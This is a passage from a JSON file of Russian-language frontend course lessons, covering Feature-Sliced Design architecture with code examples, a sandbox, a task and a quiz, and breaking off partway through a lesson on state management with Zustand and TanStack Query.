          "explanation": "Конструктор лишь запускает установку соединения, а рукопожатие занимает время, поэтому сразу после него сокет находится в промежуточном состоянии, и отправка в нём запрещена. Никакой встроенной очереди нет: отправлять можно только после наступления события открытия. На практике клиент заводит собственную очередь и разбирает её при открытии — заодно это решает задачу сообщений, написанных во время обрыва связи."
        }
      ]
    }
  },
  {
    "id": "pro-12",
    "moduleId": "pro",
    "level": 12,
    "title": "Архитектура Frontend-приложений: Feature-Sliced Design (FSD 2.0)",
    "subtitle": "Слои FSD (app, pages, widgets, features, entities, shared), Public API (index.ts) и правила зависимостей",
    "description": "Освойте архитектурный стандарт разработки масштабных фронтенд-приложений — Feature-Sliced Design (FSD 2.0): 6 слоев архитектуры, строгое правило однонаправленных зависимостей сверху-вниз, изоляцию через Public API (index.ts), сегментацию (ui, model, api, lib) и защиту архитектуры линтерами.",
    "estimatedMinutes": 65,
    "difficulty": "advanced",
    "tags": [
      "architecture",
      "fsd",
      "feature-sliced-design",
      "clean-architecture",
      "modularity",
      "scalability",
      "best-practices"
    ],
    "theory": {
      "overview": "Когда проект разрастается с 5 компонентов до 500, классическая структура папок (`/components`, `/containers`, `/utils`, `/services`) превращается в неконтролируемый «спагетти-код»: компоненты запутаны циклическими зависимостями, изменение кнопки в одном месте ломает другой экран, а новый разработчик тратит недели на онбординг.\n\nИндустриальным стандартом решения этой проблемы стала методология **Feature-Sliced Design (FSD 2.0)**. В этом уроке мы изучим иерархию 6 слоев FSD, закон однонаправленных зависимостей, концепцию Public API и научимся проектировать приложения, легко масштабируемые на команды из десятков инженеров.",
      "sections": [
        {
          "title": "Проблема хаоса в кодовой базе и зачем нужен FSD",
          "content": "Эволюция архитектурных подходов во фронтенде:\n\n1. **«Наивная» структура по типам файлов** (`/components`, `/api`, `/hooks`, `/redux`):\n- Все компоненты лежат в одной куче. Непонятно, какие компоненты относятся к пользователю, какие — к корзине, а какие — к кнопкам UI-kit.\n- Высокая связность (High Coupling) и циклические импорты (`ComponentA` импортирует `ComponentB`, а тот — `ComponentA`).\n\n2. **Feature-Sliced Design (FSD 2.0)**:\n- Архитектурная методология, разделяющая кодовую базу на **6 строго упорядоченных слоев (Layers)** по степени бизнес-ценности и переиспользуемости.\n- **Предсказуемость**: любой разработчик за 10 секунд находит нужный файл.\n- **Изоляция**: модули не зависят друг от друга горизонтально, исключая сайд-эффекты и циклические ссылки.\n- **Масштабируемость**: приложение легко делить на микрофронтенды или независимые фиче-команды.",
          "image": {
            "src": "/images/lessons/web-fsd-architecture.svg",
            "alt": "Архитектура Feature-Sliced Design FSD 2.0: слои, Public API и зависимости",
            "caption": "Иерархия FSD: app → pages → widgets → features → entities → shared. Импорты разрешены ТОЛЬКО сверху вниз. Доступ через Public API (index.ts)"
          },
          "codeExample": {
            "language": "bash",
            "code": "# Эталонная файловая структура проекта по стандарту FSD 2.0:\nsrc/\n├── app/         # Инициализация: провайдеры, роутер, глобальные стили\n├── pages/       # Экраны приложения (HomePage, ProfilePage, CatalogPage)\n├── widgets/     # Крупные блоки UI (Header, Sidebar, OrderSummary)\n├── features/    # Пользовательские сценарии (AuthByEmail, AddToCart, SearchBar)\n├── entities/    # Бизнес-сущности (User, Product, Order, Course)\n└── shared/      # Базовый переиспользуемый код (UI-Kit, API-клиент, хелперы)",
            "title": "Иерархия директорий Feature-Sliced Design (FSD 2.0)",
            "explanation": "Каждый слой решает строго определенную архитектурную задачу, устраняя путаницу между бизнес-логикой и переиспользуемыми компонентами."
          }
        },
        {
          "title": "Иерархия 6 слоев FSD: от App до Shared",
          "content": "Детальный разбор каждого из 6 слоев FSD (сверху вниз):\n\n1. **`app/` (Приложение)**:\n- Самый верхний слой. Содержит точку входа (`index.tsx`), глобальные CSS-стили, провайдеры контекста (Redux Store, TanStack Query Client), конфигурацию роутинга.\n\n2. **`pages/` (Страницы)**:\n- Маршрутизируемые экраны приложения. Страница НЕ содержит сложной логики — она лишь собирает крупные `widgets` в единый макет страницы.\n\n3. **`widgets/` (Виджеты)**:\n- Самодостаточные крупные блоки интерфейса: `Header`, `Sidebar`, `FeedList`, `ProductCatalogGrid`. Собираются из фич и сущностей.\n\n4. **`features/` (Фичи / Сценарии)**:\n- Действия пользователя, приносящие прямую бизнес-ценность (User Actions): `AuthByEmail`, `LikePost`, `FilterCatalog`, `DownloadInvoice`.\n\n5. **`entities/` (Бизнес-сущности)**:\n- Модели реального мира: `User`, `Article`, `Product`, `Comment`. Содержат карточку сущности (`UserCard`), типы (`UserType`) и стейт (`userModel`).\n\n6. **`shared/` (Общие ресурсы)**:\n- Базовый слой БЕЗ бизнес-логики: UI-kit (`Button`, `Input`, `Modal`), обертка над `fetch/axios`, хелперы дат, шрифты.",
          "codeExample": {
            "language": "typescript",
            "code": "// Пример страницы LoginPage (слой pages)\n// Страница только компонует виджеты и фичи:\nimport { AuthFormWidget } from '@/widgets/auth-form';\nimport { AuthLayout } from '@/shared/ui/layouts';\n\nexport const LoginPage = () => {\n  return (\n    <AuthLayout>\n      <AuthFormWidget />\n    </AuthLayout>\n  );\n};",
            "title": "Композиция страницы в FSD без прямой бизнес-логики",
            "explanation": "Слой pages остается тонким и чистым, делегируя логику авторизации виджету AuthFormWidget и базовую верстку слою shared."
          }
        },
        {
          "title": "Фундаментальные правила FSD: Однонаправленность и Public API",
          "content": "3 Железных закона архитектуры FSD:\n\n1. **Правило однонаправленных зависимостей (Unidirectional Flow)**:\n- Модуль может импортировать модули ТОЛЬКО из слоев, лежащих СТРОГО НИЖЕ него в иерархии:\n  `pages` → `widgets` → `features` → `entities` → `shared`.\n- ❌ ЗАПРЕЩЕНО: `entities/user` НЕ МОЖЕТ импортировать ничего из `features` или `widgets`!\n- ❌ ЗАПРЕЩЕНО: Модули на одном слое НЕ МОГУТ импортировать друг друга (`entities/user` не может импортировать `entities/product`!).\n\n2. **Изоляция через Public API (`index.ts`)**:\n- Каждый слайс (папка) ОБЯЗАН иметь файл `index.ts`, объявляющий его публичный интерфейс.\n- Снаружи разрешено импортировать ТОЛЬКО через `index.ts`:\n  `import { UserCard, userModel } from '@/entities/user';`\n- ❌ ЗАПРЕЩЕНЫ глубокие импорты: `import { helper } from '@/entities/user/ui/internal/helper';`.\n\n3. **Анатомия слайса (Сегменты)**:\nКаждый слайс внутри делится на стандартные сегменты:\n- `ui/` — React-компоненты.\n- `model/` — стейт (Redux slice, Zustand store, типы).\n- `api/` — функции сетевых запросов.\n- `lib/` — вспомогательные утилиты слайса.",
          "codeExample": {
            "language": "typescript",
            "code": "// entities/user/index.ts — Public API слайса User\n// Экспортируем ТОЛЬКО то, что нужно внешнему миру:\nexport { UserCard } from './ui/UserCard';\nexport { UserAvatar } from './ui/UserAvatar';\nexport { useUserStore } from './model/userStore';\nexport type { User, UserRole } from './model/types';\nexport { fetchUserById } from './api/userApi';\n\n// Все внутренние вспомогательные файлы в ui/internal остаются скрытыми!",
            "title": "Public API слайса entities/user/index.ts",
            "explanation": "Public API четко разделяет публичный контракт модуля и его внутренние приватные детали реализации."
          }
        },
        {
          "title": "Автоматический контроль архитектуры через ESLint Boundaries",
          "content": "Как гарантировать соблюдение FSD правил в команде из десятков разработчиков:\n\n1. Человеческий Code Review не всегда успевает отследить случайный неправильный импорт (`import from '@/features/...'` внутри `entities`).\n\n2. Плагин **`eslint-plugin-boundaries`**:\n- Настраивает строгие правила проверки зависимостей прямо в IDE и в CI/CD конвейере:\n- При попытке запрещенного импорта снизу вверх линтер моментально выдает ошибку: `Rule violation: Cannot import features from entities layer` и блокирует коммит/мерж!\n\n3. Абсолютные пути через `@/`:\nНастройка TypeScript Path Aliases (`@/app/*`, `@/shared/*`) в `tsconfig.json` делает импорты читаемыми и независимыми от вложенности папок.",
          "codeExample": {
            "language": "json",
            "code": "// .eslintrc.json — конфигурация boundaries для FSD\n{\n  \"plugins\": [\"boundaries\"],\n  \"settings\": {\n    \"boundaries/elements\": [\n      { \"type\": \"app\", \"pattern\": \"src/app\" },\n      { \"type\": \"pages\", \"pattern\": \"src/pages/*\" },\n      { \"type\": \"widgets\", \"pattern\": \"src/widgets/*\" },\n      { \"type\": \"features\", \"pattern\": \"src/features/*\" },\n      { \"type\": \"entities\", \"pattern\": \"src/entities/*\" },\n      { \"type\": \"shared\", \"pattern\": \"src/shared/*\" }\n    ]\n  }\n}",
            "title": "Автоматическая валидация слоев FSD через eslint-plugin-boundaries",
            "explanation": "Линтер автоматически предотвращает нарушение архитектурных границ на этапе компиляции и в CI конвейере."
          }
        }
      ],
      "seniorTips": [
        "Строго соблюдайте правило однонаправленных импортов сверху вниз: `app → pages → widgets → features → entities → shared`. Никогда не нарушайте этот порядок.",
        "Всегда создавайте `index.ts` для каждого слайса и импортируйте компоненты ТОЛЬКО через этот Public API.",
        "Если вам кажется, что двум сущностям (`entities/user` и `entities/order`) нужно импортировать друг друга — вынесите общую логику в `features` или свяжите их на уровне `widgets`.",
        "Подключайте `eslint-plugin-boundaries` на самом старте проекта — это защитит кодовую базу от архитектурной деградации при росте команды."
      ],
      "commonMistakes": [
        {
          "bad": "// Импорт снизу вверх (грубейшее нарушение FSD!)\n// Внутри entities/user/ui/UserCard.tsx:\nimport { AddToCartButton } from '@/features/add-to-cart'; // ❌ Ошибка!",
          "good": "// Композиция на уровне widgets/user-profile:\nimport { UserCard } from '@/entities/user';\nimport { AddToCartButton } from '@/features/add-to-cart';",
          "reason": "entities — это чистые данные. Они не должны знать о конкретных фичах. Композиция фич и сущностей происходит на слое widgets или pages."
        },
        {
          "bad": "// Глубокий импорт в обход Public API\nimport { helper } from '@/entities/user/ui/components/sub/helper';",
          "good": "import { helper } from '@/entities/user';",
          "reason": "Глубокие импорты ломают инкапсуляцию. При рефакторинге внутренней структуры слайса все глубокие импорты сломаются."
        },
        {
          "bad": "// Бизнес-логика в shared\n// shared/ui/UserAvatar.tsx (знает про поле user.vipStatus)",
          "good": "// shared/ui/Avatar.tsx (чистый UI-компонент, принимающий src и size)",
          "reason": "Слой shared не должен содержать никакой бизнес-специфики. Аватарка конкретного юзера должна лежать в entities/user."
        }
      ],
      "keyTakeaways": [
        "FSD 2.0 делит приложение на 6 слоев: app, pages, widgets, features, entities, shared.",
        "Импорты разрешены ТОЛЬКО сверху вниз (Unidirectional Flow), исключая циклические зависимости.",
        "Public API (`index.ts`) скрывает внутренние детали реализации каждого слайса.",
        "Слайсы делятся на стандартные сегменты: ui, model, api, lib.",
        "`eslint-plugin-boundaries` автоматически защищает архитектуру в CI/CD конвейере."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"fsd-app\">\n  <h3>FSD Архитектурный Валидатор Импортов</h3>\n  <div style=\"margin-bottom:8px;\">\n    <label>Откуда импортируем (Слой A):</label>\n    <select id=\"from-layer\" style=\"background:#161b22; color:#2dff8a; border:1px solid #30363d; padding:4px 8px;\">\n      <option value=\"pages\">pages</option>\n      <option value=\"widgets\">widgets</option>\n      <option value=\"features\">features</option>\n      <option value=\"entities\" selected>entities</option>\n      <option value=\"shared\">shared</option>\n    </select>\n  </div>\n  <div style=\"margin-bottom:12px;\">\n    <label>Что импортируем (Слой B):</label>\n    <select id=\"to-layer\" style=\"background:#161b22; color:#29e7ff; border:1px solid #30363d; padding:4px 8px;\">\n      <option value=\"pages\">pages</option>\n      <option value=\"widgets\">widgets</option>\n      <option value=\"features\" selected>features</option>\n      <option value=\"entities\">entities</option>\n      <option value=\"shared\">shared</option>\n    </select>\n  </div>\n  <button id=\"check-import\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:8px 16px; font-weight:bold; cursor:pointer;\">Проверить валидность импорта</button>\n  <div id=\"import-result\" style=\"margin-top:12px; font-size:13px; font-weight:bold;\"></div>\n</div>",
      "initialCss": "#fsd-app { font-family: monospace; color: #e6edf3; padding: 16px; background: #0d1117; border-radius: 8px; }",
      "initialJs": "const hierarchy = ['app', 'pages', 'widgets', 'features', 'entities', 'shared'];\nconst fromSelect = document.getElementById('from-layer');\nconst toSelect = document.getElementById('to-layer');\nconst resEl = document.getElementById('import-result');\n\ndocument.getElementById('check-import').onclick = () => {\n  const from = fromSelect.value;\n  const to = toSelect.value;\n  const fromIdx = hierarchy.indexOf(from);\n  const toIdx = hierarchy.indexOf(to);\n  \n  if (fromIdx < toIdx) {\n    resEl.style.color = '#2dff8a';\n    resEl.textContent = `✅ ВАЛИДНО: ${from} (уровень ${fromIdx}) может импортировать из ${to} (уровень ${toIdx}) — импорт направлен вниз!`;\n  } else if (fromIdx === toIdx) {\n    resEl.style.color = '#f85149';\n    resEl.textContent = `❌ ЗАПРЕЩЕНО: Горизонтальные импорты внутри одного слоя ${from} запрещены в FSD!`;\n  } else {\n    resEl.style.color = '#f85149';\n    resEl.textContent = `❌ АРХИТЕКТУРНАЯ ОШИБКА: ${from} НЕ МОЖЕТ импортировать из вышележащего слоя ${to}!`;\n  }\n};",
      "instructions": "Практика с архитектурой FSD:\n1. Проверьте импорт из entities в features — увидите ошибку импорта снизу вверх\n2. Проверьте импорт из pages в widgets — получите подтверждение валидности\n3. Проверьте кросс-импорт entities в entities"
    },
    "task": {
      "title": "Проектирование структуры каталога интернет-магазина по методологии FSD 2.0",
      "scenario": "Вам необходимо спроектировать модульную архитектуру интернет-магазина по стандарту FSD 2.0: распределить компоненты, модели данных, API-запросы и кнопки по 6 слоям (app, pages, widgets, features, entities, shared) и оформить Public API для сущности Product.",
      "criteria": [
        "Четко разграничены 6 слоев FSD (app, pages, widgets, features, entities, shared)",
        "Слой entities/product содержит ui (ProductCard), model (types, store), api (fetchProducts)",
        "Оформлен файл Public API entities/product/index.ts",
        "Соблюдено правило зависимостей сверху-вниз (entities не зависят от features)"
      ],
      "starterCode": {
        "js": "// Спроектируйте структуру и оформите entities/product/index.ts\n// Ваш код"
      },
      "hints": [
        "В entities/product создайте сегменты ui, model, api",
        "В index.ts экспортируйте: export { ProductCard } from './ui/ProductCard';",
        "Экспортируйте типы: export type { Product } from './model/types';"
      ],
      "solution": {
        "js": "// 1. Файловая структура слайса entities/product:\n// src/entities/product/\n// ├── ui/\n// │   ├── ProductCard.tsx\n// │   └── ProductPrice.tsx\n// ├── model/\n// │   ├── types.ts\n// │   └── productSlice.ts\n// ├── api/\n// │   └── productApi.ts\n// └── index.ts (Public API)\n\n// 2. entities/product/index.ts (Public API):\nexport { ProductCard } from './ui/ProductCard';\nexport { ProductPrice } from './ui/ProductPrice';\nexport { fetchProductById, fetchAllProducts } from './api/productApi';\nexport { useProductStore } from './model/productSlice';\nexport type { Product, ProductCategory, ProductRating } from './model/types';\n\n// 3. Использование в виджете Каталога (widgets/product-catalog):\n// import { ProductCard, type Product } from '@/entities/product';\n// import { AddToCartButton } from '@/features/add-to-cart';\n// import { Container } from '@/shared/ui/layout';",
        "explanation": "Слайс entities/product строго изолирован: инкапсулирует UI, стейт и сетевые запросы, предоставляя лаконичный Public API index.ts без утечки внутренних деталей."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro12-q1",
          "question": "Модуль из слоя сущностей импортирует компонент из слоя фич. Почему это нарушение архитектуры?",
          "options": [
            "Импорты разрешены только снизу вверх, поэтому направление здесь обратное",
            "Импорты разрешены только сверху вниз, а слой фич расположен выше слоя сущностей",
            "Слои вообще не должны импортировать друг друга, связь идёт только через приложение",
            "Нарушения нет: соседние слои могут свободно обращаться друг к другу в обе стороны"
          ],
          "correctIndex": 1,
          "explanation": "Слои выстроены по убыванию специфичности: приложение, страницы, виджеты, фичи, сущности, общий слой. Модуль вправе импортировать только то, что лежит строго ниже. Это и не даёт появиться циклическим зависимостям и гарантирует, что нижние слои переносимы: сущность не знает ни об одной фиче и потому переиспользуется в любой из них."
        },
        {
          "id": "pro12-q2",
          "question": "Карточка товара должна показывать кнопку «В корзину». Карточка лежит в сущностях, кнопка — в фичах. Где их соединить?",
          "options": [
            "В сущностях: карточка сама подключит нужную кнопку обычным импортом",
            "В слое приложения: только он имеет право связывать модули разных слоёв",
            "В общем слое: туда выносят всё, что требуется сразу нескольким местам",
            "В виджетах или на странице: композиция выполняется на слое выше обоих"
          ],
          "correctIndex": 3,
          "explanation": "Стандартный приём — оставить в карточке слот для действия, а подставить туда конкретную кнопку уже на уровне композиции. Так карточка остаётся чистым представлением данных и переиспользуется в каталоге, в избранном и в истории заказов, где действия разные. Общий слой для этого не годится: там не должно быть ничего, связанного с предметной областью."
        },
        {
          "id": "pro12-q3",
          "question": "Чем плох второй вариант импорта?",
          "codeSnippet": "import { UserCard } from 'entities/user';                       // (1)\nimport { UserCard } from 'entities/user/ui/UserCard/UserCard';  // (2)",
          "options": [
            "Он просто длиннее и хуже читается, никаких других отличий между вариантами нет",
            "Он лезет во внутреннюю структуру слайса и сломается при её перестройке",
            "Он подтягивает весь слайс целиком, заметно увеличивая размер собранного бандла",
            "Он не поддерживается сборщиком без дополнительной настройки псевдонимов путей"
          ],
          "correctIndex": 1,
          "explanation": "Файл публичного интерфейса на входе в слайс — это контракт: снаружи видно только то, что он экспортирует, а внутреннюю раскладку можно свободно менять. Глубокий импорт этот контракт обходит, и любое переименование папки ломает десятки чужих файлов. Кроме того, по такому импорту невозможно понять, что является публичным, а что деталью реализации."
        },
        {
          "id": "pro12-q4",
          "question": "Что из перечисленного НЕ должно лежать в общем слое?",
          "options": [
            "Компонент аватара пользователя, знающий про поля профиля",
            "Настроенный клиент для выполнения сетевых запросов",
            "Базовая кнопка интерфейса без всякой привязки к предметной области",
            "Утилита форматирования дат и относительного времени"
          ],
          "correctIndex": 0,
          "explanation": "Общий слой — это фундамент, который ничего не знает о бизнесе: элементы интерфейса, сетевой клиент, вспомогательные функции, константы. Как только модуль начинает разбираться в структуре пользователя, он принадлежит соответствующей сущности. Иначе общий слой постепенно превращается в свалку, зависящую от всего сразу, и переиспользовать его в другом проекте становится невозможно."
        },
        {
          "id": "pro12-q5",
          "question": "Как не дать архитектуре деградировать по мере роста команды?",
          "options": [
            "Описать правила в документации и проверять их вручную на каждом код-ревью",
            "Регулярно проводить рефакторинг, возвращая структуру к исходному состоянию",
            "Запретить создание новых слайсов без согласования с ведущим разработчиком",
            "Подключить плагин линтера, проверяющий направление импортов прямо в конвейере"
          ],
          "correctIndex": 3,
          "explanation": "Документацию читают один раз при онбординге, а ревьюер под конец дня не заметит один неудачный импорт среди трёхсот строк. Правило, проверяемое машиной, работает всегда: нарушение направления или обход публичного интерфейса подсвечивается прямо в редакторе и валит проверку в конвейере. Настраивать такой плагин дешевле всего в самом начале, пока нарушений ещё нет."
        }
      ]
    }
  },
  {
    "id": "pro-13",
    "moduleId": "pro",
    "level": 13,
    "title": "State Management: управление состоянием в SPA",
    "subtitle": "Local, Global, Server и URL State. Redux Toolkit, Zustand, TanStack Query, Jotai и React Context",
    "description": "Освойте все виды состояния в SPA-приложениях: локальное (useState), глобальное (Redux Toolkit, Zustand), серверное (TanStack Query, SWR, stale-while-revalidate) и URL-состояние (параметры маршрута). Научитесь выбирать правильный стейт-менеджер для проекта любого масштаба.",
    "estimatedMinutes": 65,
    "difficulty": "advanced",
    "tags": [
      "state-management",
      "redux-toolkit",
      "zustand",
      "tanstack-query",
      "react-context",
      "jotai",
      "server-state",
      "url-state"
    ],
    "theory": {
      "overview": "Состояние (State) — это данные, от которых зависит, что видит пользователь на экране. В простом приложении достаточно `useState`, но при росте до десятков экранов, авторизации, корзины, фильтров и кеша API-ответов — управление состоянием становится **главной архитектурной задачей** фронтенда.\n\nВ этом уроке мы классифицируем 4 типа состояния, разберём индустриальные решения (Redux Toolkit, Zustand, TanStack Query) и научимся выбирать правильный инструмент для проекта любого масштаба.",
      "sections": [
        {
          "title": "4 типа состояния в SPA-приложении",
          "content": "Классификация состояния по зоне ответственности:\n\n1. **Local State (Локальное / Компонентное)**:\n- Принадлежит одному компоненту: открыт ли модал, значение текстового поля, текущий слайд карусели.\n- Инструменты: `useState`, `useRef`, `useReducer`.\n- Правило: если состояние нужно ТОЛЬКО в одном компоненте — оставьте его локальным!\n\n2. **Global State (Глобальное / Клиентское)**:\n- Разделяется между многими компонентами в разных частях дерева: авторизация, тема (dark/light), корзина товаров, языковая локаль.\n- Инструменты: Redux Toolkit, Zustand, Jotai, MobX, React Context (для простых случаев).\n\n3. **Server State (Серверное / Кеш API)**:\n- Данные, полученные от сервера: списки пользователей, заказов, товаров.\n- Отличается от клиентского: данные «не наши» — они принадлежат серверу и могут устареть. Нужен кеш, ревалидация, оптимистичные обновления.\n- Инструменты: TanStack Query (React Query), SWR, RTK Query.\n\n4. **URL State (Маршрутное)**:\n- Состояние, отражённое в URL: `?page=2&sort=price&category=shoes`.\n- Фильтры, пагинация, поиск — всё, чем пользователь может поделиться ссылкой.\n- Инструменты: React Router (`useSearchParams`), nuqs, Next.js params.",
          "image": {
            "src": "/images/lessons/web-state-management.svg",
            "alt": "4 типа состояния в SPA: Local, Global, Server, URL и однонаправленный поток данных",
            "caption": "4 типа состояния: Local (useState), Global (Redux/Zustand), Server (TanStack Query), URL (?page=2). Однонаправленный поток: UI → Action → Store → UI"
          },
          "codeExample": {
            "language": "javascript",
            "code": "// ===== 4 типа состояния в одном компоненте =====\n\nfunction ProductCatalog() {\n  // 1. LOCAL STATE — открыт ли фильтр\n  const [isFilterOpen, setFilterOpen] = useState(false);\n\n  // 2. GLOBAL STATE — авторизация (из Zustand)\n  const user = useAuthStore((s) => s.user);\n\n  // 3. SERVER STATE — список товаров (из TanStack Query)\n  const { data: products, isLoading } = useQuery({\n    queryKey: ['products', filters],\n    queryFn: () => api.get('/products', { params: filters }),\n    staleTime: 5 * 60 * 1000, // Кеш свежий 5 минут\n  });\n\n  // 4. URL STATE — фильтры из строки URL\n  const [searchParams, setSearchParams] = useSearchParams();\n  const page = Number(searchParams.get('page') || 1);\n  const sort = searchParams.get('sort') || 'popular';\n\n  return <div>...</div>;\n}",
            "title": "Все 4 типа состояния: useState, Zustand, TanStack Query и useSearchParams",
            "explanation": "Каждый тип состояния управляется своим специализированным инструментом. Смешивание ответственностей приводит к хаосу."
          }
        },
        {
          "title": "Zustand — минималистичный глобальный стейт-менеджер",
          "content": "Zustand — глобальный стейт-менеджер нового поколения (3 КБ, Zero Boilerplate):\n\nПреимущества Zustand перед Redux:\n- **Нулевой бойлерплейт**: нет action types, reducers, action creators, dispatch, switch-case.\n- **3 КБ** gzip (Redux Toolkit ≈ 11 КБ + React-Redux ≈ 5 КБ).\n- **Нет Providers**: не нужно оборачивать приложение в `<Provider store={store}>`.\n- **Прямая мутация** через Immer (опционально) или ручные обновления.\n- **Встроенные middleware**: persist (localStorage), devtools (Redux DevTools), subscribeWithSelector.\n\nКогда использовать Zustand:\n- Средние проекты (5–30 экранов).\n- Когда нужна простота без бойлерплейта Redux.\n- Для standalone глобального стейта: тема, авторизация, корзина, тосты.",
          "codeExample": {
            "language": "javascript",
            "code": "// store/useCartStore.js — Zustand стор корзины (весь файл!)\nimport { create } from 'zustand';\nimport { persist } from 'zustand/middleware';\n\nconst useCartStore = create(\n  persist(\n    (set, get) => ({\n      items: [],\n      \n      // Добавить товар (или +1 к количеству)\n      addItem: (product) => set((state) => {\n        const existing = state.items.find(i => i.id === product.id);\n        if (existing) {\n          return { items: state.items.map(i =>\n            i.id === product.id ? { ...i, qty: i.qty + 1 } : i\n          )};\n        }\n        return { items: [...state.items, { ...product, qty: 1 }] };\n      }),\n      \n      // Удалить товар\n      removeItem: (id) => set((state) => ({\n        items: state.items.filter(i => i.id !== id)\n      })),\n      \n      // Подсчёт общей суммы (вычисляемое значение)\n      get totalPrice() {\n        return get().items.reduce((sum, i) => sum + i.price * i.qty, 0);\n      },\n      \n      // Очистить корзину\n      clearCart: () => set({ items: [] }),\n    }),\n    { name: 'cart-storage' } // Автосохранение в localStorage!\n  )\n);\n\n// Использование в компоненте:\n// const items = useCartStore(s => s.items);\n// const addItem = useCartStore(s => s.addItem);",
            "title": "Zustand: полноценная корзина с persist в localStorage за 30 строк",
            "explanation": "Zustand создаёт стор одной функцией create(). Middleware persist автоматически сохраняет корзину в localStorage и восстанавливает при перезагрузке."
          }
        },
        {
          "title": "TanStack Query — управление серверным состоянием и кешем API",
          "content": "Почему серверное состояние нельзя хранить в Redux/Zustand:\n- Данные из API **принадлежат серверу**, а не клиенту. Они могут устареть в любой момент.\n- Нужен **кеш с ревалидацией**: показать устаревшие данные мгновенно из кеша, а в фоне загрузить свежие (pattern **stale-while-revalidate**).\n- Нужны автоматические повторы при сбое, пагинация, бесконечная прокрутка, оптимистичные обновления.\n\nTanStack Query (React Query v5) решает все эти задачи:\n- `useQuery()` — GET-запросы с кешем, автоматическим рефетчем и стейтом загрузки.\n- `useMutation()` — POST/PUT/DELETE с оптимистичными обновлениями и инвалидацией кеша.\n- `staleTime` — время, в течение которого кеш считается свежим и повторный запрос не отправляется.\n- `gcTime` (бывший `cacheTime`) — время жизни кеша после размонтирования компонента.",
          "codeExample": {
            "language": "javascript",
            "code": "// hooks/useProducts.js — серверный стейт через TanStack Query\nimport { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';\nimport { api } from '../shared/api/apiClient';\n\n// GET: Получить список товаров с кешем\nexport function useProducts(filters) {\n  return useQuery({\n    queryKey: ['products', filters],   // Уникальный ключ кеша\n    queryFn: () => api.get('/products', { params: filters }),\n    staleTime: 5 * 60 * 1000,          // 5 минут — данные считаются свежими\n    placeholderData: (previousData) => previousData, // Показываем старые, пока грузятся новые\n  });\n}\n\n// POST: Создать товар + оптимистичное обновление\nexport function useCreateProduct() {\n  const queryClient = useQueryClient();\n  \n  return useMutation({\n    mutationFn: (newProduct) => api.post('/products', newProduct),\n    \n    // Мгновенно добавляем товар в UI (до ответа сервера!)\n    onMutate: async (newProduct) => {\n      await queryClient.cancelQueries({ queryKey: ['products'] });\n      const previous = queryClient.getQueryData(['products']);\n      queryClient.setQueryData(['products'], (old) => [\n        ...old, { ...newProduct, id: Date.now() } // Временный id\n      ]);\n      return { previous }; // Сохраняем для отката\n    },\n    \n    // При ошибке — откатываем оптимистичное обновление\n    onError: (err, vars, context) => {\n      queryClient.setQueryData(['products'], context.previous);\n    },\n    \n    // При любом исходе — обновляем кеш с сервера\n    onSettled: () => {\n      queryClient.invalidateQueries({ queryKey: ['products'] });\n    },\n  });\n}",
            "title": "TanStack Query: кеш, stale-while-revalidate и оптимистичные обновления",
            "explanation": "useQuery кеширует данные на 5 минут. useMutation с onMutate мгновенно обновляет UI, а при ошибке откатывает изменения к предыдущему состоянию."
          }
        },
        {
          "title": "Как выбрать стейт-менеджер: матрица решений",
          "content": "Практическая матрица выбора инструментов по масштабу проекта:\n\n1. **Маленький проект (1–5 экранов, 1 разработчик)**:\n- Local: `useState` + `useReducer`.\n- Global: `React Context` (тема, локаль).\n- Server: `fetch` + `useState` или `useSWR`.\n- Не подключайте Redux для двух переменных!\n\n2. **Средний проект (5–20 экранов, 2–5 разработчиков)**:\n- Local: `useState`.\n- Global: **Zustand** (3 КБ, zero boilerplate, persist middleware).\n- Server: **TanStack Query** (кеш, ревалидация, пагинация).\n- URL: `useSearchParams`.\n\n3. **Крупный Enterprise (50+ экранов, 10+ разработчиков)**:\n- Local: `useState`.\n- Global: **Redux Toolkit** (строгость, DevTools, middleware, ecosystem).\n- Server: **RTK Query** (встроен в RTK) или **TanStack Query**.\n- URL: `useSearchParams` + `nuqs`.\n\nЗолотое правило: **не смешивайте серверный и клиентский стейт!** Серверные данные (API-ответы) управляются TanStack Query, а клиентские (тема, корзина, модалы) — Zustand/Redux.",
          "codeExample": {
            "language": "javascript",
            "code": "// ===== Антипаттерн: серверные данные в Redux (НЕ ДЕЛАЙТЕ ТАК!) =====\n// ❌ Redux-стор забит устаревшими данными из API\n// const usersSlice = createSlice({\n//   initialState: { users: [], loading: false, error: null },\n//   reducers: { setUsers, setLoading, setError },\n// });\n// useEffect(() => { dispatch(fetchUsers()); }, []);\n\n// ===== Правильный подход: разделение ответственности =====\n\n// ✅ Серверные данные — TanStack Query (кеш + ревалидация)\nconst { data: users, isLoading } = useQuery({\n  queryKey: ['users'],\n  queryFn: fetchUsers,\n  staleTime: 60_000,\n});\n\n// ✅ Клиентский стейт — Zustand (тема, модалы, корзина)\nconst theme = useThemeStore((s) => s.theme);\nconst toggleTheme = useThemeStore((s) => s.toggleTheme);\n\n// ✅ URL стейт — useSearchParams (фильтры, пагинация)\nconst [params] = useSearchParams();\nconst page = Number(params.get('page') || 1);",
            "title": "Разделение ответственности: TanStack Query + Zustand + URL",
            "explanation": "Каждый тип данных управляется специализированным инструментом. Серверные данные в Redux — антипаттерн, создающий ручное управление кешем."
          }
        }
      ],
      "seniorTips": [
        "Никогда не храните данные из API в Redux/Zustand напрямую — используйте TanStack Query (или RTK Query) для автоматического кеширования, ревалидации и обработки стейтов загрузки.",
        "Используйте Zustand вместо Redux для средних проектов — в 5 раз меньше бойлерплейта и в 3 раза меньше бандл.",
        "Всегда разделяйте серверный стейт (API-кеш) и клиентский стейт (тема, модалы, корзина) — это два принципиально разных класса данных.",
        "Фильтры каталога, пагинацию и поисковую строку храните в URL (?page=2&sort=price) через useSearchParams — это позволяет делиться ссылками и сохраняет состояние при навигации."
      ],
      "commonMistakes": [
        {
          "bad": "// Хранение серверных данных в Redux с ручным управлением\nconst [users, setUsers] = useState([]);\nconst [loading, setLoading] = useState(false);\nuseEffect(() => { setLoading(true); fetchUsers().then(setUsers).finally(() => setLoading(false)); }, []);",
          "good": "// TanStack Query управляет кешем, загрузкой и ошибками автоматически\nconst { data: users, isLoading, error } = useQuery({ queryKey: ['users'], queryFn: fetchUsers });",
          "reason": "Ручное управление isLoading, error и кешем — бойлерплейт, создающий баги. TanStack Query решает это декларативно."
        },
        {
